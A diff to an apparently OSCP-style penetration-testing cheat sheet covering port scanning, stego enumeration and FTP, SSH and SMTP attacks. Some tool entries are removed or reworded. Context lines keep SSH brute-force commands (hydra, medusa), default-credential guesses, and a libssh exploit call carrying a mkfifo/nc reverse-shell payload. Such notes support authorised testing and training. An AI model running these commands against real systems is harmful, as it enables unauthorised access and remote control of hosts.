@@ -6,7 +6,6 @@ Table of Contents
       * [Enumeration](#enumeration)
       * [File enumeration](#file-enumeration)
          * [Common](#common)
-         * [Disk files](#disk-files)
          * [Images](#images)
          * [Audio](#audio)
       * [Port 21 - FTP](#port-21-ftp)
@@ -162,10 +161,6 @@ masscan -p1-65535,U:1-65535 --rate=1000 192.168.232.43 -e tun0 > ports
 ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
 sudo nmap -Pn -sV -sC -p$ports 192.168.232.43
 
-# OneTwoPunch
-https://raw.githubusercontent.com/superkojiman/onetwopunch/master/onetwopunch.sh
-onetwopunch.sh ip.txt tcp
-
 # Scan for UDP
 nmap 10.11.1.111 -sU
 unicornscan -mU -v -I 10.11.1.111
@@ -175,10 +170,6 @@ nc -u 10.11.1.111 48772
 
 # Responder
 responder -I eth0 -A
-
-# Amass
-amass enum -ip 10.11.1.1/24
-
 ```
 
 ## Enumeration 
@@ -206,20 +197,7 @@ ghex file.xxx
 # Check metadata
 exiftool file.xxx
 
-# Stego tool for multiple formats
-wget https://embeddedsw.net/zip/OpenPuff_release.zip
-unzip OpenPuff_release.zip -d ./OpenPuff
-wine OpenPuff/OpenPuff_release/OpenPuff.exe
 ```
-
-### Disk files
-
-```
-# guestmount can mount any kind of disk file
-sudo apt-get install libguestfs-tools
-guestmount --add yourVirtualDisk.vhdx --inspector --ro /mnt/anydirectory
-```
-
 ### Images
 
 ```
@@ -253,18 +231,17 @@ hideme stego.mp3 -f && cat output.txt #AudioStego
 (https://book.hacktricks.xyz/pentesting/pentesting-ftp)
 ```
 nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.11.1.111
-USER anonymous / admin / found username
-PASS anonymous / admin / found username
+USER anonymous / admin / ftp / found username
+PASS anonymous / admin / ftp / found username
 Try:
   get put (*.aspx,*.asp,*.php)
 ```
 
 ## Port 22 - SSH
-
-- If you have usernames test login with username:username
-- Vulnerable Versions: 7.2p1
-
 ```
+Test login with username:username
+Vulnerable Versions: 7.2p1
+
 Vulnerable Versions: 7.2p1
 nc 10.11.1.111 22
 
@@ -326,24 +303,14 @@ $ GIT_SSH_COMMAND='ssh -i ~/Proving_Grounds/Hunit/id_rsa -o IdentitiesOnly=yes' 
 
 BruteForce:
 
-patator ssh_login host=10.11.1.111 port=22 user=root 0=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt password=FILE0 -x ignore:mesg='Authentication failed.'
 hydra -l user -P /usr/share/wordlists/password/rockyou.txt -e s ssh://10.10.1.111
 medusa -h 10.10.1.111 -u user -P /usr/share/wordlists/password/rockyou.txt -e s -M ssh
-ncrack --user user -P /usr/share/wordlists/password/rockyou.txt ssh://10.10.1.111
 
 LibSSH Before 0.7.6 and 0.8.4 - LibSSH 0.7.6 / 0.8.4 - Unauthorized Access
 Id
 python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 id
 Reverse
 python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.1.111 80 >/tmp/f"
-
-SSH FUZZ
-https://dl.packetstormsecurity.net/fuzzer/sshfuzz.txt
-
-cpan Net::SSH2
-./sshfuzz.pl -H 10.10.1.111 -P 22 -u user -p user
-
-use auxiliary/fuzzers/ssh/ssh_version_2
 
 SSH-AUDIT
 https://github.com/arthepsy/ssh-audit
@@ -354,7 +321,6 @@ https://github.com/arthepsy/ssh-audit
 • https://www.exploit-db.com/exploits/46516 ~ OpenSSH SCP Client – Write Arbitrary Files
 
 http://www.vegardno.net/2017/03/fuzzing-openssh-daemon-using-afl.html
-
 
 SSH Enum users < 7.7:
 https://github.com/six2dez/ssh_enum_script
@@ -420,7 +386,6 @@ MAIL FROM:admin@admin.com
 RCPT TO:DestinationEmail@DestinationDomain.com
 DATA
 test
-
 .
 
 Receive:
